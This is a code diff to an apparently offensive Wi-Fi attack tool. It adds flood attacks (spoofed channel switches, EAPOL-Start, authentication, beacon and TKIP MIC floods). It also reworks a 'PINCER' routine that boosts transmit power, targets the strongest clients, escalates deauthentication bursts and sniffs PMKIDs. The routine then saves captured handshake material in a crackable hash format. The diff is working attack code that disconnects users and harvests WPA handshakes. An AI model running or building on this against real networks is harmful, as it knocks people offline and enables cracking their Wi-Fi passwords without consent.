@@ -103,6 +103,59 @@ class AttackRunner:
         return f"sent {sent} deauth frames to {client}"
 
     # ------------------------------------------------------------------
+    # DoS / protocol-disruption floods (v2.4)
+    # ------------------------------------------------------------------
+
+    def csa_spoof(self, ap, new_channel: int, client: str | None = None) -> str:
+        from ..attacks.csa_spoof import send_csa
+        from ..frames import BROADCAST
+
+        target = client or BROADCAST
+        sent = send_csa(
+            self._iface, ap.bssid, new_channel, client=target, count=10,
+            channel=ap.channel, progress_fn=self._progress_fn, stop_event=self._stop_event,
+        )
+        return f"sent {sent} CSA frame(s) telling {target} to switch to channel {new_channel}"
+
+    def eapol_flood(self, ap, count: int = 100) -> str:
+        from ..attacks.eapol_flood import eapol_flood
+
+        sent = eapol_flood(
+            self._iface, ap.bssid, count=count, channel=ap.channel,
+            progress_fn=self._progress_fn, stop_event=self._stop_event,
+        )
+        return f"sent {sent} EAPOL-Start frame(s) to {ap.bssid}"
+
+    def auth_flood(self, ap, count: int = 100) -> str:
+        from ..attacks.auth_flood import auth_flood
+
+        sent = auth_flood(
+            self._iface, ap.bssid, count=count, channel=ap.channel,
+            progress_fn=self._progress_fn, stop_event=self._stop_event,
+        )
+        return f"sent {sent} auth request(s) to {ap.bssid}"
+
+    def beacon_flood(self, channel: int | None, count: int = 100) -> str:
+        from ..attacks.beacon_flood import beacon_flood
+
+        sent = beacon_flood(
+            self._iface, count=count, channel=channel,
+            progress_fn=self._progress_fn, stop_event=self._stop_event,
+        )
+        return f"sent {sent} fake beacon(s)"
+
+    def tkip_mic_flood(self, ap, client: str | None = None) -> str:
+        from ..attacks.tkip_mic_flood import tkip_mic_flood
+        from ..frames import BROADCAST
+
+        target = client or BROADCAST
+        sent = tkip_mic_flood(
+            self._iface, ap.bssid, client=target, channel=ap.channel,
+            progress_fn=self._progress_fn, stop_event=self._stop_event,
+        )
+        return f"sent {sent} bad-MIC frame(s) to {ap.bssid} (client={target})"
+
+    # ------------------------------------------------------------------
     # Native WPA/WEP captures
     # ------------------------------------------------------------------
 
@@ -356,8 +409,10 @@ class AttackRunner:
                watch_capture_fn: Callable[[str, threading.Event], None]) -> str:
         from ..attacks.deauth import deauth
         from ..attacks.handshake import HandshakeCapture, HandshakeStatus, capture_handshake
-        from ..attacks.logic import best_status, run_deauth_flow, select_client
-        from ..radio import ensure_channel, get_mode, set_managed_mode, set_monitor_mode
+        from ..attacks.pmkid import capture_pmkid
+        from ..attacks.logic import best_status, select_client
+        from ..frames import BROADCAST
+        from ..radio import ensure_channel, get_mode, set_managed_mode, set_monitor_mode, set_txpower, get_max_txpower
         from ..storage import target_capture_dir
 
         if ap.pmf == "required":
@@ -368,15 +423,11 @@ class AttackRunner:
         interval = 10
         out_dir = target_capture_dir(ap.ssid, ap.bssid)
         out_file = out_dir / f"pincer_{int(time.time())}.pcap"
-        # burst_size=64 keeps PINCER's existing frame count -- see
-        # attacks/logic.py; History.md, 2026-09-13.
         cap = HandshakeCapture()
+        pmkid_found: list[str] = []
 
         # Both mode-sets live INSIDE the try: if the second set_monitor_mode
-        # raises, the finally below must still restore the first radio --
-        # previously it was left stuck in monitor mode (the restore only ran
-        # for failures after both calls succeeded). The *_mon vars stay None
-        # for any radio that never made it, and the finally skips those.
+        # raises, the finally below must still restore the first radio.
         scan_mon = attack_mon = None
         scan_perm_mac = attack_perm_mac = None
         try:
@@ -393,6 +444,35 @@ class AttackRunner:
             else:
                 self._log("PINCER: no channel known for target — radios left on their current channel")
 
+            # TX power optimization for attack radio
+            max_tx = get_max_txpower(attack_mon)
+            if max_tx is not None:
+                self._log(f"PINCER: {attack_mon} max TX power: {max_tx} dBm")
+            if set_txpower(attack_mon, 20):
+                self._log(f"PINCER: {attack_mon} TX power set to 20 dBm")
+            else:
+                self._log(f"PINCER: {attack_mon} TX power set failed (may already be at max)")
+
+            # Client targeting: rank by signal strength, pick top 1-2
+            if ap.client_signal:
+                sorted_clients = sorted(ap.client_signal, key=lambda m: ap.client_signal[m], reverse=True)
+                targets = sorted_clients[:2]
+                self._log(f"PINCER: targeting strongest clients: {', '.join(targets)}")
+            elif ap.clients:
+                targets = [next(iter(ap.clients))]
+                self._log(f"PINCER: targeting client {targets[0]} (no signal data)")
+            else:
+                targets = [BROADCAST]
+                self._log("PINCER: no clients known — targeting broadcast")
+
+            # Beacon timing: estimate interval from beacon_count and scan duration
+            beacon_interval = None
+            if ap.beacon_count > 1 and ap.first_seen and ap.last_seen:
+                duration = ap.last_seen - ap.first_seen
+                if duration > 0:
+                    beacon_interval = duration / (ap.beacon_count - 1)
+                    self._log(f"PINCER: estimated beacon interval: {beacon_interval * 1000:.0f}ms")
+
             def listen():
                 capture_handshake(
                     scan_mon, ap.bssid, channel=ap.channel,
@@ -400,29 +480,88 @@ class AttackRunner:
                     stop_event=self._stop_event, progress_fn=self._log, cap=cap,
                 )
 
-            self._log(f"PINCER: {scan_mon} starting EAPOL listener, writing to {out_file}")
+            def sniff_pmkid():
+                """Passive PMKID sniffer on the scan radio."""
+                line = capture_pmkid(
+                    scan_mon, ap.bssid, self._mac, channel=ap.channel,
+                    essid=ap.ssid, timeout=interval * max_rounds + 15,
+                    stop_event=self._stop_event, progress_fn=self._log,
+                )
+                if line:
+                    pmkid_found.append(line)
+
+            self._log(f"PINCER: {scan_mon} starting EAPOL listener + PMKID sniffer, writing to {out_file}")
             listener = threading.Thread(target=listen, daemon=True)
             listener.start()
+            pmkid_sniffer = threading.Thread(target=sniff_pmkid, daemon=True)
+            pmkid_sniffer.start()
             watch_stop = threading.Event()
             threading.Thread(target=watch_capture_fn, args=(str(out_file), watch_stop), daemon=True).start()
 
-            client = select_client(ap)
-            run_deauth_flow(
-                deauth, attack_mon, ap, client, cap,
-                max_rounds=max_rounds, round_interval=interval, burst_size=64,
-                min_status=HandshakeStatus.CHALLENGE,
-                stop_event=self._stop_event, progress_fn=self._log,
-            )
+            # Adaptive deauth escalation loop
+            burst_sizes = [8, 16, 32, 64]
+            burst_idx = 0
+            rounds_at_level = 0
+            rounds_per_level = 3
+
+            for round_no in range(1, max_rounds + 1):
+                if self._stop_event.is_set():
+                    break
+                if pmkid_found:
+                    self._log(f"PINCER: PMKID captured passively — stopping deauth after {round_no - 1} round(s)")
+                    break
+                if best_status(cap) is not HandshakeStatus.NONE:
+                    self._log(f"PINCER: handshake material captured — stopping deauth after {round_no - 1} round(s)")
+                    break
+
+                burst = burst_sizes[burst_idx]
+                # Beacon timing: fire ~100ms after expected beacon
+                if beacon_interval is not None and round_no > 1:
+                    time.sleep(0.1)  # post-beacon window
+
+                # Cycle through target clients
+                target = targets[(round_no - 1) % len(targets)]
+                reason = (1, 2, 3, 6, 7, 8, 15)[(round_no - 1) % 7]
+
+                sent = deauth(
+                    attack_mon, ap.bssid, client=target, count=burst,
+                    channel=ap.channel, reason=reason, progress_fn=self._log,
+                    stop_event=self._stop_event,
+                )
+                if sent == 0:
+                    self._log(f"PINCER deauth round {round_no}/{max_rounds}: did NOT go out (burst={burst}, target={target})")
+                else:
+                    self._log(f"PINCER deauth round {round_no}/{max_rounds}: sent {sent} frame(s) (burst={burst}, target={target}, reason={reason})")
+
+                rounds_at_level += 1
+                if rounds_at_level >= rounds_per_level and best_status(cap) is HandshakeStatus.NONE and burst_idx < len(burst_sizes) - 1:
+                    burst_idx += 1
+                    rounds_at_level = 0
+                    self._log(f"PINCER: escalating burst size to {burst_sizes[burst_idx]}")
+
+                self._stop_event.wait(interval)
 
             listener.join(timeout=5)
+            pmkid_sniffer.join(timeout=5)
             watch_stop.set()
         finally:
             self._log("PINCER: restoring radios to managed mode")
             if attack_mon is not None:
-                set_managed_mode(attack_mon, restore_mac=attack_perm_mac)
+                try:
+                    set_managed_mode(attack_mon, restore_mac=attack_perm_mac)
+                except Exception:  # noqa: BLE001 - teardown must be best-effort
+                    self._log(f"PINCER: failed to restore {attack_mon} to managed mode")
             if scan_mon is not None:
-                set_managed_mode(scan_mon, restore_mac=scan_perm_mac)
+                try:
+                    set_managed_mode(scan_mon, restore_mac=scan_perm_mac)
+                except Exception:  # noqa: BLE001 - teardown must be best-effort
+                    self._log(f"PINCER: failed to restore {scan_mon} to managed mode")
             self._log("PINCER: radios restored")
+
+        if pmkid_found:
+            out_22000 = out_dir / f"pincer_pmkid_{int(time.time())}.22000"
+            out_22000.write_text(pmkid_found[0] + "\n")
+            return f"PMKID captured -> {out_22000}"
 
         status = best_status(cap)
         if status is HandshakeStatus.AUTHORIZED:
